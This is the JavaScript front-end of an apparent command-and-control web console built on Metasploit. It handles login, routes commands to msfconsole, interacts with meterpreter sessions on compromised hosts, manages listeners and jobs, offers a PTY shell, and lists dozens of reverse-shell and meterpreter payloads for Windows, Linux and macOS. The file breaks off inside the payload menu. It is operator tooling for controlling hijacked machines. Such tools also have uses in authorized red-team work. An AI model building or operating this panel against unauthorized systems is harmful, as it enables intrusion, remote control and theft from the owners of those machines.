/**
 * C2 Console - MSF + PTY
 * Clean version - no LLM, no Celery, no tasks
 */

// ============================================================================
// STATE
// ============================================================================
let ws = null;
let token = null;
let currentUser = null;
let commandHistory = [];
let historyIndex = -1;
let msfConnected = false;
let msfConsoleId = null;
let currentSessionId = null;  // Track active meterpreter session

// MSF Commands - all go to msfconsole
const COMMANDS = {
    help: { desc: 'Show commands', usage: 'help' },
    clear: { desc: 'Clear terminal', usage: 'clear' },
    exit: { desc: 'Logout', usage: 'exit' },
    msf: { desc: 'MSF connection', usage: 'msf connect|status' },
};

// ============================================================================
// INIT
// ============================================================================
document.addEventListener('DOMContentLoaded', () => {
    setupEventListeners();
    
    const storedToken = localStorage.getItem('c2_token');
    const storedUser = localStorage.getItem('c2_user');
    if (storedToken && storedUser) {
        token = storedToken;
        currentUser = JSON.parse(storedUser);
        showConsole();
    }
});

function setupEventListeners() {
    // Key login
    const keyLoginBtn = document.getElementById('key-login-btn');
    if (keyLoginBtn) {
        keyLoginBtn.addEventListener('click', handleKeyLogin);
    }
    
    // Logout
    const logoutBtn = document.getElementById('logout-btn');
    if (logoutBtn) {
        logoutBtn.addEventListener('click', handleLogout);
    }
    
    // Terminal input
    const input = document.getElementById('terminal-input');
    if (input) {
        input.addEventListener('keydown', handleTerminalKeydown);
    }
    
    // Tabs
    document.querySelectorAll('.tab').forEach(tab => {
        tab.addEventListener('click', () => switchTab(tab.dataset.tab));
    });
}

// ============================================================================
// AUTH
// ============================================================================
async function handleKeyLogin(e) {
    if (e) e.preventDefault();
    
    const privateKey = document.getElementById('private-key').value.trim();
    const errorEl = document.getElementById('key-login-error');
    const loginBtn = document.getElementById('key-login-btn');
    
    if (errorEl) errorEl.textContent = '';
    
    if (!privateKey) {
        if (errorEl) errorEl.textContent = '[ERROR] Private key required';
        return;
    }
    
    loginBtn.disabled = true;
    
    try {
        const response = await fetch('/auth/key', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ private_key: privateKey })
        });
        
        const data = await response.json();
        
        if (!response.ok) {
            throw new Error(data.detail || 'Auth failed');
        }
        
        token = data.access_token;
        currentUser = data.user;
        
        localStorage.setItem('c2_token', token);
        localStorage.setItem('c2_user', JSON.stringify(currentUser));
        
        showConsole();
        
    } catch (err) {
        if (errorEl) errorEl.textContent = `[ERROR] ${err.message}`;
    } finally {
        loginBtn.disabled = false;
    }
}

function handleLogout() {
    token = null;
    currentUser = null;
    localStorage.removeItem('c2_token');
    localStorage.removeItem('c2_user');
    localStorage.removeItem('token');
    localStorage.removeItem('currentUser');
    localStorage.removeItem('msf_console_id');
    localStorage.removeItem('msf_connected');
    
    if (ws) {
        ws.close();
        ws = null;
    }
    
    document.getElementById('login-screen').style.display = 'flex';
    document.getElementById('console').style.display = 'none';
}

function showLogin() {
    // Alias for handleLogout - clears everything and shows login
    handleLogout();
}

// ============================================================================
// CONSOLE
// ============================================================================
async function showConsole() {
    document.getElementById('login-screen').style.display = 'none';
    document.getElementById('console').style.display = 'flex';
    
    connectWebSocket();
    
    // Restore MSF state from localStorage
    const savedConsoleId = localStorage.getItem('msf_console_id');
    if (savedConsoleId) {
        msfConsoleId = savedConsoleId;
    }
    
    // Check MSF status and auto-reconnect
    await checkMsfStatus();
    
    // If was connected, restore state
    if (msfConnected) {
        printLine('[*] Restored MSF connection', 'info');
        refreshJobsUI();
        refreshSessionsUI();
    }
    
    bootSequence();
}

async function bootSequence() {
    const lines = [
        { text: '╔══════════════════════════════════════════════════════════╗', cls: 'success' },
        { text: '║           CYBER C2 - METASPLOIT CONSOLE                  ║', cls: 'success' },
        { text: '╚══════════════════════════════════════════════════════════╝', cls: 'success' },
        { text: '' },
        { text: '[*] MSF Console ready - all commands go to msfconsole', cls: 'info' },
        { text: '[*] Use PTY tab for full interactive shell', cls: 'info' },
        { text: '' },
    ];
    
    for (const line of lines) {
        printLine(line.text, line.cls || '');
        await sleep(30);
    }
    
    document.getElementById('terminal-input')?.focus();
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// ============================================================================
// WEBSOCKET
// ============================================================================
function connectWebSocket() {
    if (!token || !currentUser) return;
    
    const wsProtocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
    const wsUrl = `${wsProtocol}//${window.location.host}/ws/${currentUser.username}?token=${token}`;
    
    ws = new WebSocket(wsUrl);
    
    ws.onopen = () => {
        console.log('WebSocket connected');
        updateWsStatus('connected');
    };
    
    ws.onclose = (event) => {
        console.log('WebSocket closed', event.code);
        updateWsStatus('disconnected');
        
        // If closed with auth error (4001 or server rejected), force re-login
        if (event.code === 4001 || event.code === 1006 || event.code === 403) {
            console.log('Auth failed, clearing token and showing login');
            localStorage.removeItem('token');
            localStorage.removeItem('currentUser');
            token = null;
            currentUser = null;
            showLogin();
            return; // Don't retry
        }
        
        setTimeout(connectWebSocket, 3000);
    };
    
    ws.onerror = (err) => {
        console.error('WebSocket error:', err);
    };
    
    ws.onmessage = (event) => {
        try {
            const data = JSON.parse(event.data);
            handleMessage(data);
        } catch (e) {
            console.error('WS parse error:', e);
        }
    };
}

function handleMessage(data) {
    if (data.type === 'pong') return;
    if (data.type === 'system') {
        printLine(`[*] ${data.message}`, 'system');
    }
}

function updateWsStatus(status) {
    const el = document.getElementById('ws-status');
    if (el) {
        el.textContent = status === 'connected' ? '● CONNECTED' : '○ DISCONNECTED';
        el.className = status === 'connected' ? 'connected' : 'disconnected';
    }
}

// ============================================================================
// TERMINAL INPUT
// ============================================================================
function handleTerminalKeydown(e) {
    const input = e.target;
    
    if (e.key === 'Enter') {
        e.preventDefault();
        const cmd = input.value.trim();
        if (cmd) {
            commandHistory.push(cmd);
            historyIndex = commandHistory.length;
            executeCommand(cmd);
        }
        input.value = '';
    }
    else if (e.key === 'ArrowUp') {
        e.preventDefault();
        if (historyIndex > 0) {
            historyIndex--;
            input.value = commandHistory[historyIndex];
        }
    }
    else if (e.key === 'ArrowDown') {
        e.preventDefault();
        if (historyIndex < commandHistory.length - 1) {
            historyIndex++;
            input.value = commandHistory[historyIndex];
        } else {
            historyIndex = commandHistory.length;
            input.value = '';
        }
    }
    else if (e.key === 'Tab') {
        e.preventDefault();
        // Simple autocomplete
        const val = input.value.trim();
        const matches = Object.keys(COMMANDS).filter(c => c.startsWith(val));
        if (matches.length === 1) {
            input.value = matches[0] + ' ';
        }
    }
}

function executeCommand(cmdLine) {
    // If in a session, route command to that session
    if (currentSessionId !== null) {
        printLine(`meterpreter(${currentSessionId})> ${cmdLine}`, 'command');
        executeSessionCommand(currentSessionId, cmdLine);
        return;
    }
    
    printLine(`msf> ${cmdLine}`, 'command');
    
    const parts = cmdLine.trim().split(/\s+/);
    const cmd = parts[0].toLowerCase();
    const args = parts.slice(1);
    
    // Local commands
    if (cmd === 'help') {
        showHelp();
        return;
    }
    if (cmd === 'clear') {
        clearTerminal();
        return;
    }
    if (cmd === 'exit') {
        handleLogout();
        return;
    }
    if (cmd === 'msf') {
        handleMsfCommand(args);
        return;
    }
    // API-based commands (faster than console)
    if (cmd === 'sessions' && args.length === 0) {
        showSessions();
        return;
    }
    // Session interaction: "sessions 1" or "session 1" or "sessions -i 1"
    if ((cmd === 'sessions' || cmd === 'session') && args.length > 0) {
        let sessionId = args[0];
        if (args[0] === '-i' && args.length > 1) {
            sessionId = args[1];
        }
        interactSession(sessionId);
        return;
    }
    if (cmd === 'jobs') {
        if (args.length === 0) {
            showJobs();
            return;
        }
        if (args[0] === '-K' || args[0] === '-k') {
            killAllJobs();
            return;
        }
    }
    
    // Everything else goes to MSF console
    sendMsfConsoleCommand(cmdLine);
}

// ============================================================================
// MSF FUNCTIONS
// ============================================================================
async function checkMsfStatus() {
    try {
        const response = await fetch('/api/msf/status', {
            headers: { 'Authorization': `Bearer ${token}` }
        });
        const data = await response.json();
        msfConnected = data.connected;
        updateMsfStatus(msfConnected);
        
        // Update localStorage
        if (msfConnected) {
            localStorage.setItem('msf_connected', 'true');
        } else {
            localStorage.removeItem('msf_connected');
            localStorage.removeItem('msf_console_id');
        }
    } catch (e) {
        msfConnected = false;
        updateMsfStatus(false);
    }
}

function updateMsfStatus(connected) {
    const el = document.getElementById('msf-status');
    if (el) {
        el.textContent = connected ? '● MSF CONNECTED' : '○ MSF DISCONNECTED';
        el.className = connected ? 'connected' : 'disconnected';
    }
}

async function handleMsfCommand(args) {
    const action = args[0]?.toLowerCase();
    
    if (action === 'connect') {
        printLine('[*] Connecting to MSF RPC...', 'info');
        try {
            const response = await fetch('/api/msf/connect', {
                method: 'POST',
                headers: { 
                    'Authorization': `Bearer ${token}`,
                    'Content-Type': 'application/json'
                }
            });
            const data = await response.json();
            if (data.success) {
                printLine('[+] Connected to Metasploit', 'success');
                msfConnected = true;
                updateMsfStatus(true);
            } else {
                printLine(`[-] ${data.error || 'Connection failed'}`, 'error');
            }
        } catch (e) {
            printLine(`[-] Error: ${e.message}`, 'error');
        }
    }
    else if (action === 'disconnect') {
        await fetch('/api/msf/disconnect', {
            method: 'POST',
            headers: { 'Authorization': `Bearer ${token}` }
        });
        msfConnected = false;
        updateMsfStatus(false);
        printLine('[*] Disconnected from MSF', 'info');
    }
    else if (action === 'status') {
        await checkMsfStatus();
        printLine(msfConnected ? '[+] MSF: Connected' : '[-] MSF: Disconnected', msfConnected ? 'success' : 'warning');
    }
    else {
        printLine('Usage: msf connect|disconnect|status', 'info');
    }
}

async function sendMsfConsoleCommand(command) {
    if (!msfConnected) {
        printLine('[-] Not connected to MSF. Run: msf connect', 'error');
        return;
    }
    
    try {
        const response = await fetch('/api/msf/console/execute', {
            method: 'POST',
            headers: {
                'Authorization': `Bearer ${token}`,
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ 
                command: command,
                console_id: msfConsoleId 
            })
        });
        
        if (!response.ok) {
            printLine(`[-] HTTP Error: ${response.status}`, 'error');
            return;
        }
        
        const text = await response.text();
        let data;
        try {
            data = JSON.parse(text);
        } catch (parseErr) {
            printLine(`[-] Invalid response: ${text.substring(0, 100)}`, 'error');
            return;
        }
        
        if (data.error) {
            printLine(`[-] ${data.error}`, 'error');
            return;
        }
        
        if (data.console_id) {
            msfConsoleId = data.console_id;
            // Save console ID for page refresh recovery
            localStorage.setItem('msf_console_id', msfConsoleId);
        }
        
        if (data.data) {
            printMsfOutput(data.data);
        }
        
        // Poll for more output if busy
        if (data.busy) {
            await pollMsfOutput();
        }
        
    } catch (e) {
        printLine(`[-] Error: ${e.message}`, 'error');
    }
}

async function pollMsfOutput() {
    if (!msfConsoleId) return;
    
    let busy = true;
    while (busy) {
        await sleep(500);
        try {
            const response = await fetch('/api/msf/console/read', {
                method: 'POST',
                headers: {
                    'Authorization': `Bearer ${token}`,
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ console_id: msfConsoleId })
            });
            const data = await response.json();
            
            if (data.data) {
                printMsfOutput(data.data);
            }
            busy = data.busy || false;
        } catch (e) {
            busy = false;
        }
    }
}

function printMsfOutput(output) {
    if (!output) return;
    
    // Split by lines and print with color coding
    const lines = output.split('\n');
    for (const line of lines) {
        if (line.includes('[+]') || line.includes('success')) {
            printLine(line, 'success');
        } else if (line.includes('[-]') || line.includes('error') || line.includes('failed')) {
            printLine(line, 'error');
        } else if (line.includes('[*]') || line.includes('[!]')) {
            printLine(line, 'info');
        } else {
            printLine(line);
        }
    }
}

// ============================================================================
// TERMINAL OUTPUT
// ============================================================================
function printLine(text, className = '') {
    const output = document.getElementById('terminal-output');
    if (!output) return;
    
    const line = document.createElement('div');
    line.className = `output-line ${className}`;
    line.textContent = text;
    output.appendChild(line);
    scrollToBottom();
}

function scrollToBottom() {
    const output = document.getElementById('terminal-output');
    if (output) {
        output.scrollTop = output.scrollHeight;
    }
}

function clearTerminal() {
    const output = document.getElementById('terminal-output');
    if (output) {
        output.innerHTML = '';
    }
}

function showHelp() {
    printLine('');
    printLine('╔══════════════════════════════════════════════════════════╗', 'success');
    printLine('║                    C2 COMMANDS                           ║', 'success');
    printLine('╚══════════════════════════════════════════════════════════╝', 'success');
    printLine('');
    printLine('  LOCAL COMMANDS:', 'info');
    printLine('    help              - Show this help');
    printLine('    clear             - Clear terminal');
    printLine('    exit              - Logout');
    printLine('    msf connect       - Connect to MSF RPC');
    printLine('    msf status        - Check MSF connection');
    printLine('');
    printLine('  MSF CONSOLE:', 'info');
    printLine('    All other commands go directly to msfconsole', 'dim');
    printLine('    Examples: use, search, set, run, sessions, etc.', 'dim');
    printLine('');
    printLine('  PTY TAB:', 'info');
    printLine('    Full interactive shell for any commands', 'dim');
    printLine('');
}

// ============================================================================
// PTY TERMINAL
// ============================================================================
let ptyTerminal = null;
let ptySocket = null;
let ptyInitialized = false;

function initPtyTerminal() {
    if (ptyInitialized) return;
    
    const container = document.getElementById('pty-terminal');
    if (!container) return;
    
    ptyTerminal = new Terminal({
        cursorBlink: true,
        fontSize: 14,
        fontFamily: '"JetBrains Mono", "SF Mono", Monaco, monospace',
        theme: {
            background: '#000000',
            foreground: '#00ff41',
            cursor: '#00ff41',
            cursorAccent: '#000000',
            black: '#000000',
            red: '#ff5555',
            green: '#55ff55',
            yellow: '#ffff55',
            blue: '#5555ff',
            magenta: '#ff55ff',
            cyan: '#55ffff',
            white: '#ffffff'
        },
        allowTransparency: false,
        scrollback: 10000
    });
    
    window.fitAddon = new FitAddon.FitAddon();
    ptyTerminal.loadAddon(window.fitAddon);
    
    ptyTerminal.open(container);
    window.fitAddon.fit();
    
    // Connect PTY WebSocket
    const wsProtocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
    ptySocket = new WebSocket(`${wsProtocol}//${window.location.host}/ws/pty`);
    
    ptySocket.onopen = () => {
        ptyTerminal.write('\r\n\x1b[32m[*] PTY connected\x1b[0m\r\n');
        ptyTerminal.write('\x1b[33m[*] Full interactive shell ready\x1b[0m\r\n\r\n');
    };
    
    ptySocket.onmessage = (event) => {
        ptyTerminal.write(event.data);
    };
    
    ptySocket.onclose = () => {
        ptyTerminal.write('\r\n\x1b[31m[!] PTY disconnected\x1b[0m\r\n');
    };
    
    ptySocket.onerror = () => {
        ptyTerminal.write('\r\n\x1b[31m[!] PTY error\x1b[0m\r\n');
    };
    
    // Send input to PTY
    ptyTerminal.onData((data) => {
        if (ptySocket && ptySocket.readyState === WebSocket.OPEN) {
            ptySocket.send(JSON.stringify({ type: 'input', data: data }));
        }
    });
    
    // Handle resize
    window.addEventListener('resize', () => {
        if (ptyTerminal && window.fitAddon) {
            window.fitAddon.fit();
        }
    });
    
    ptyInitialized = true;
    ptyTerminal.focus();
}

// ============================================================================
// BITS C2 TERMINAL
// ============================================================================
let bitsInitialized = false;

function initBitsTerminal() {
    if (bitsInitialized) return;
    
    const token = localStorage.getItem('c2_token');
    if (!token) {
        alert('Authentication token not found. Please login first.');
        return;
    }
    
    const iframe = document.getElementById('bits-iframe');
    if (iframe) {
        // Add cache bust version
        iframe.src = `/static/bits.html?v=${Date.now()}&token=${encodeURIComponent(token)}`;
        bitsInitialized = true;
    }
}

// ============================================================================
// TAB SWITCHING
// ============================================================================
function switchTab(tabName) {
    const tabs = document.querySelectorAll('.tab');
    const terminalWindow = document.querySelector('.terminal-window');
    const mainOutput = document.getElementById('terminal-output');
    const ptyContainer = document.getElementById('pty-terminal');
    const bitsContainer = document.getElementById('bits-terminal');
    const mainInput = document.getElementById('main-input-area');
    
    tabs.forEach(t => t.classList.remove('active'));
    const clickedTab = document.querySelector(`.tab[data-tab="${tabName}"]`);
    if (clickedTab) clickedTab.classList.add('active');
    
    if (tabName === 'pty') {
        if (terminalWindow) terminalWindow.classList.add('pty-active');
        if (mainOutput) mainOutput.style.display = 'none';
        if (ptyContainer) {
            ptyContainer.style.display = 'flex';
            ptyContainer.style.flex = '1';
        }
        if (bitsContainer) bitsContainer.style.display = 'none';
        if (mainInput) mainInput.style.display = 'none';
        if (!ptyInitialized) initPtyTerminal();
        if (ptyTerminal) {
            setTimeout(() => {
                ptyTerminal.focus();
                // Re-fit terminal after display change
                if (window.fitAddon) window.fitAddon.fit();
            }, 100);
        }
    } else if (tabName === 'bits') {
        if (terminalWindow) terminalWindow.classList.add('pty-active');
        if (mainOutput) mainOutput.style.display = 'none';
        if (ptyContainer) ptyContainer.style.display = 'none';
        if (bitsContainer) {
            bitsContainer.style.display = 'flex';
        }
        if (mainInput) mainInput.style.display = 'none';
        if (!bitsInitialized) initBitsTerminal();
    } else {
        if (terminalWindow) terminalWindow.classList.remove('pty-active');
        if (mainOutput) mainOutput.style.display = 'block';
        if (ptyContainer) ptyContainer.style.display = 'none';
        if (bitsContainer) bitsContainer.style.display = 'none';
        if (mainInput) mainInput.style.display = 'flex';
        document.getElementById('terminal-input')?.focus();
    }
}

// ============================================================================
// MSF CONTROL BUTTONS
// ============================================================================
async function startMsf() {
    printLine('[*] Connecting to MSF RPC...', 'info');
    try {
        const response = await fetch('/api/msf/connect', {
            method: 'POST',
            headers: { 
                'Authorization': `Bearer ${token}`,
                'Content-Type': 'application/json'
            }
        });
        const data = await response.json();
        if (data.success) {
            printLine('[+] Connected to Metasploit', 'success');
            msfConnected = true;
            localStorage.setItem('msf_connected', 'true');
            updateMsfStatus(true);
            // Refresh panels
            refreshJobsUI();
            refreshSessionsUI();
        } else {
            printLine(`[-] ${data.error || 'Connection failed'}`, 'error');
        }
    } catch (e) {
        printLine(`[-] Error: ${e.message}`, 'error');
    }
}

async function killMsf() {
    try {
        await fetch('/api/msf/disconnect', {
            method: 'POST',
            headers: { 'Authorization': `Bearer ${token}` }
        });
        msfConnected = false;
        msfConsoleId = null;
        // Clear saved state
        localStorage.removeItem('msf_connected');
        localStorage.removeItem('msf_console_id');
        updateMsfStatus(false);
        printLine('[*] Disconnected from MSF', 'info');
    } catch (e) {
        printLine(`[-] Error: ${e.message}`, 'error');
    }
}

// ============================================================================
// STUB FUNCTIONS (tasks removed - these are just to prevent errors)
// ============================================================================
function refreshTasks() {
    printLine('[*] Tasks disabled - use MSF jobs command', 'dim');
}

function clearAllTasks() {
    printLine('[*] Tasks disabled', 'dim');
}

function clearCompletedTasks() {
    printLine('[*] Tasks disabled', 'dim');
}

function addTarget() {
    printLine('[*] Use PTY terminal for target operations', 'dim');
}

// ============================================================================
// MODAL FUNCTIONS
// ============================================================================
function closeCyberModal() {
    const modal = document.getElementById('cyber-modal');
    if (modal) modal.style.display = 'none';
}

function closeCyberPrompt(value) {
    const modal = document.getElementById('cyber-prompt-modal');
    if (modal) modal.style.display = 'none';
}

function submitCyberPrompt() {
    closeCyberPrompt(null);
}

// ============================================================================
// MSF SESSIONS & JOBS API
// ============================================================================
async function getMsfSessions() {
    try {
        const response = await fetch('/api/msf/sessions', {
            headers: { 'Authorization': `Bearer ${token}` }
        });
        const data = await response.json();
        return data.sessions || [];
    } catch (e) {
        return [];
    }
}

async function getMsfJobs() {
    try {
        const response = await fetch('/api/msf/jobs', {
            headers: { 'Authorization': `Bearer ${token}` }
        });
        const data = await response.json();
        return data.jobs || {};
    } catch (e) {
        return {};
    }
}

async function showSessions() {
    const sessions = await getMsfSessions();
    printLine('');
    printLine('═══════════════════════════════════════════════════', 'info');
    printLine('                  ACTIVE SESSIONS', 'info');
    printLine('═══════════════════════════════════════════════════', 'info');
    
    if (sessions.length === 0) {
        printLine('  No active sessions', 'dim');
    } else {
        for (const s of sessions) {
            printLine(`  [${s.id}] ${s.type} - ${s.tunnel_peer || s.target_host}`, 'success');
            if (s.info) printLine(`      Info: ${s.info}`, 'dim');
        }
    }
    printLine('');
}

async function showJobs() {
    const jobs = await getMsfJobs();
    printLine('');
    printLine('═══════════════════════════════════════════════════', 'info');
    printLine('                   ACTIVE JOBS', 'info');
    printLine('═══════════════════════════════════════════════════', 'info');
    
    const jobIds = Object.keys(jobs);
    if (jobIds.length === 0) {
        printLine('  No active jobs', 'dim');
    } else {
        for (const id of jobIds) {
            const j = jobs[id];
            printLine(`  [${id}] ${j.name || 'Unknown'}`, 'success');
            if (j.datastore) {
                const ds = j.datastore;
                if (ds.LHOST) printLine(`      LHOST: ${ds.LHOST}:${ds.LPORT || '4444'}`, 'dim');
            }
        }
    }
    printLine('');
}

async function killMsfJob(jobId) {
    try {
        await fetch(`/api/msf/jobs/${jobId}`, {
            method: 'DELETE',
            headers: { 'Authorization': `Bearer ${token}` }
        });
        printLine(`[+] Killed job ${jobId}`, 'success');
    } catch (e) {
        printLine(`[-] Error: ${e.message}`, 'error');
    }
}

async function killAllJobs() {
    printLine('[*] Killing all jobs...', 'info');
    try {
        const jobs = await getMsfJobs();
        const jobIds = Object.keys(jobs);
        if (jobIds.length === 0) {
            printLine('[*] No jobs to kill', 'dim');
            return;
        }
        for (const id of jobIds) {
            await killMsfJob(id);
        }
        printLine(`[+] Killed ${jobIds.length} job(s)`, 'success');
        printLine('[*] Note: Restart msfrpcd to reset job IDs to 0', 'dim');
        refreshJobsUI();
    } catch (e) {
        printLine(`[-] Error: ${e.message}`, 'error');
    }
}

async function killMsfSession(sessionId) {
    try {
        await fetch(`/api/msf/sessions/${sessionId}`, {
            method: 'DELETE',
            headers: { 'Authorization': `Bearer ${token}` }
        });
        printLine(`[+] Killed session ${sessionId}`, 'success');
    } catch (e) {
        printLine(`[-] Error: ${e.message}`, 'error');
    }
}

async function interactSession(sessionId) {
    printLine(`[*] Interacting with session ${sessionId}...`, 'info');
    
    // First verify session exists
    const sessions = await getMsfSessions();
    const session = sessions.find(s => s.id == sessionId);
    
    if (!session) {
        printLine(`[-] Session ${sessionId} not found`, 'error');
        return;
    }
    
    currentSessionId = sessionId;
    printLine(`[+] Now in session ${sessionId} (${session.type})`, 'success');
    printLine(`[*] Target: ${session.info || session.tunnel_peer}`, 'dim');
    printLine(`[*] Type meterpreter commands (sysinfo, getuid, shell, etc.)`, 'dim');
    printLine(`[*] Type 'background' to return to msf console`, 'dim');
    printLine('');
    
    // Show initial prompt
    printLine(`meterpreter(${sessionId})> `, 'prompt', false);
}

async function executeSessionCommand(sessionId, command) {
    if (command === 'background' || command === 'bg') {
        currentSessionId = null;
        printLine('[*] Backgrounding session...', 'info');
        printLine('msf> ', 'prompt', false);
        return;
    }
    
    try {
        const response = await fetch(`/api/msf/sessions/${sessionId}/execute`, {
            method: 'POST',
            headers: {
                'Authorization': `Bearer ${token}`,
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ command: command })
        });
        
        if (!response.ok) {
            printLine(`[-] HTTP Error: ${response.status}`, 'error');
            return;
        }
        
        const data = await response.json();
        if (data.error) {
            printLine(`[-] ${data.error}`, 'error');
        } else if (data.output) {
            // Print output line by line
            const lines = data.output.split('\\n');
            for (const line of lines) {
                printLine(line, 'output');
            }
        } else {
            printLine('(No output)', 'dim');
        }
    } catch (e) {
        printLine(`[-] Error: ${e.message}`, 'error');
    }
    
    // Show prompt again
    printLine(`meterpreter(${sessionId})> `, 'prompt', false);
}

// ============================================================================
// UI PANEL REFRESH FUNCTIONS
// ============================================================================
async function refreshSessionsUI() {
    const sessionList = document.getElementById('session-list');
    if (!sessionList) return;
    
    try {
        const sessions = await getMsfSessions();
        if (!sessions || sessions.length === 0) {
            sessionList.innerHTML = '<div class="session-item idle">No sessions</div>';
        } else {
            sessionList.innerHTML = '';
            for (const s of sessions) {
                const item = document.createElement('div');
                item.className = 'session-item active';
                item.innerHTML = `
                    <div class="session-header">
                        <span class="session-id">[${s.id}]</span>
                        <span class="session-type">${s.type || 'shell'}</span>
                        <button class="btn-tiny danger" onclick="killMsfSession(${s.id})">✕</button>
                    </div>
                    <div class="session-info">${s.info || s.tunnel_peer || 'Unknown'}</div>
                `;
                sessionList.appendChild(item);
            }
        }
    } catch (e) {
        sessionList.innerHTML = '<div class="session-item error">Error loading</div>';
    }
}

async function refreshJobsUI() {
    const jobsList = document.getElementById('jobs-list');
    if (!jobsList) return;
    
    try {
        const jobs = await getMsfJobs();
        const jobIds = Object.keys(jobs);
        if (jobIds.length === 0) {
            jobsList.innerHTML = '<div class="job-item idle">No jobs</div>';
        } else {
            jobsList.innerHTML = '';
            for (const id of jobIds) {
                const j = jobs[id];
                const item = document.createElement('div');
                item.className = 'job-item active';
                const info = j.datastore ? `${j.datastore.LHOST || ''}:${j.datastore.LPORT || ''}` : '';
                item.innerHTML = `
                    <div class="job-header">
                        <span class="job-id">[${id}]</span>
                        <span class="job-name">${j.name || 'Job'}</span>
                        <button class="btn-tiny danger" onclick="killMsfJob(${id})">✕</button>
                    </div>
                    ${info ? `<div class="job-info">${info}</div>` : ''}
                `;
                jobsList.appendChild(item);
            }
        }
    } catch (e) {
        jobsList.innerHTML = '<div class="job-item error">Error loading</div>';
    }
}

// Auto-refresh panels every 10 seconds when connected
setInterval(() => {
    if (msfConnected) {
        refreshSessionsUI();
        refreshJobsUI();
    }
}, 10000);

// ============================================================================
// LISTENER SETUP MODAL
// ============================================================================
function showListenerModal() {
    if (!msfConnected) {
        printLine('[-] Connect to MSF first', 'error');
        return;
    }
    
    const modal = document.getElementById('cyber-modal');
    const title = document.getElementById('modal-title');
    const body = document.getElementById('modal-body');
    const footer = document.getElementById('modal-footer');
    
    title.textContent = 'CREATE LISTENER';
    
    body.innerHTML = `
        <div class="modal-form-group">
            <label class="modal-label">Payload</label>
            <select class="modal-select" id="listener-payload" onchange="updateSSLOption()">
                <optgroup label="── Windows x64 STAGELESS ──">
                    <option value="windows/x64/meterpreter_reverse_https">windows/x64/meterpreter_reverse_https</option>
                    <option value="windows/x64/meterpreter_reverse_http">windows/x64/meterpreter_reverse_http</option>
                    <option value="windows/x64/meterpreter_reverse_tcp">windows/x64/meterpreter_reverse_tcp</option>
                    <option value="windows/x64/shell_reverse_tcp">windows/x64/shell_reverse_tcp</option>
                </optgroup>
                <optgroup label="── Windows x64 STAGED ──">
                    <option value="windows/x64/meterpreter/reverse_https">windows/x64/meterpreter/reverse_https</option>
                    <option value="windows/x64/meterpreter/reverse_http">windows/x64/meterpreter/reverse_http</option>
                    <option value="windows/x64/meterpreter/reverse_tcp">windows/x64/meterpreter/reverse_tcp</option>
                    <option value="windows/x64/meterpreter/reverse_tcp_rc4">windows/x64/meterpreter/reverse_tcp_rc4</option>
                    <option value="windows/x64/meterpreter/reverse_winhttp">windows/x64/meterpreter/reverse_winhttp</option>
                    <option value="windows/x64/meterpreter/reverse_winhttps">windows/x64/meterpreter/reverse_winhttps</option>
                    <option value="windows/x64/meterpreter/bind_tcp">windows/x64/meterpreter/bind_tcp</option>
                    <option value="windows/x64/shell/reverse_tcp">windows/x64/shell/reverse_tcp</option>
                </optgroup>
                <optgroup label="── Windows x86 (32-bit) STAGELESS ──">
                    <option value="windows/meterpreter_reverse_https">windows/meterpreter_reverse_https</option>
                    <option value="windows/meterpreter_reverse_http">windows/meterpreter_reverse_http</option>
                    <option value="windows/meterpreter_reverse_tcp">windows/meterpreter_reverse_tcp</option>
                    <option value="windows/shell_reverse_tcp">windows/shell_reverse_tcp</option>
                </optgroup>
                <optgroup label="── Windows x86 (32-bit) STAGED ──">
                    <option value="windows/meterpreter/reverse_https">windows/meterpreter/reverse_https</option>
                    <option value="windows/meterpreter/reverse_http">windows/meterpreter/reverse_http</option>
                    <option value="windows/meterpreter/reverse_tcp">windows/meterpreter/reverse_tcp</option>
                    <option value="windows/meterpreter/reverse_tcp_rc4">windows/meterpreter/reverse_tcp_rc4</option>
                    <option value="windows/meterpreter/reverse_winhttp">windows/meterpreter/reverse_winhttp</option>
                    <option value="windows/meterpreter/reverse_winhttps">windows/meterpreter/reverse_winhttps</option>
                    <option value="windows/meterpreter/bind_tcp">windows/meterpreter/bind_tcp</option>
                    <option value="windows/shell/reverse_tcp">windows/shell/reverse_tcp</option>
                </optgroup>
                <optgroup label="── Linux x64 STAGELESS ──">
                    <option value="linux/x64/meterpreter_reverse_https">linux/x64/meterpreter_reverse_https</option>
                    <option value="linux/x64/meterpreter_reverse_http">linux/x64/meterpreter_reverse_http</option>
                    <option value="linux/x64/meterpreter_reverse_tcp">linux/x64/meterpreter_reverse_tcp</option>
                    <option value="linux/x64/shell_reverse_tcp">linux/x64/shell_reverse_tcp</option>
                </optgroup>
                <optgroup label="── Linux x64 STAGED ──">
                    <option value="linux/x64/meterpreter/reverse_https">linux/x64/meterpreter/reverse_https</option>
                    <option value="linux/x64/meterpreter/reverse_tcp">linux/x64/meterpreter/reverse_tcp</option>
                    <option value="linux/x64/meterpreter/bind_tcp">linux/x64/meterpreter/bind_tcp</option>
                    <option value="linux/x64/shell/reverse_tcp">linux/x64/shell/reverse_tcp</option>
                </optgroup>
                <optgroup label="── Linux x86 (32-bit) ──">
                    <option value="linux/x86/meterpreter_reverse_https">linux/x86/meterpreter_reverse_https</option>
                    <option value="linux/x86/meterpreter_reverse_tcp">linux/x86/meterpreter_reverse_tcp</option>
                    <option value="linux/x86/meterpreter/reverse_tcp">linux/x86/meterpreter/reverse_tcp</option>
                    <option value="linux/x86/shell/reverse_tcp">linux/x86/shell/reverse_tcp</option>
                </optgroup>
                <optgroup label="── macOS x64 ──">
                    <option value="osx/x64/meterpreter_reverse_https">osx/x64/meterpreter_reverse_https</option>
                    <option value="osx/x64/meterpreter_reverse_tcp">osx/x64/meterpreter_reverse_tcp</option>
                    <option value="osx/x64/meterpreter/reverse_https">osx/x64/meterpreter/reverse_https</option>
                    <option value="osx/x64/meterpreter/reverse_tcp">osx/x64/meterpreter/reverse_tcp</option>
                    <option value="osx/x64/shell_reverse_tcp">osx/x64/shell_reverse_tcp</option>
                </optgroup>
                <optgroup label="── Multi-Platform ──">
                    <option value="java/meterpreter/reverse_https">java/meterpreter/reverse_https</option>
                    <option value="java/meterpreter/reverse_http">java/meterpreter/reverse_http</option>
